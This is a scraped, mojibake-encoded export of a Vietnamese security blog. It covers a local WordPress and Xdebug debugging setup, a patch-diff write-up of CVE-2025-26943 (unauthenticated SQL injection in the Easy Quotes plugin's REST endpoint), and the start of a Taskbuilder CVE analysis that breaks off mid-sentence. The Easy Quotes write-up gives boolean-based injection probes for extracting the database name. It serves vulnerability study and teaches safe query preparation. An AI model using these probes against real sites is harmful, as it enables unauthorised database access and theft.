C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nBáº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w {: .prompt-info }\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o 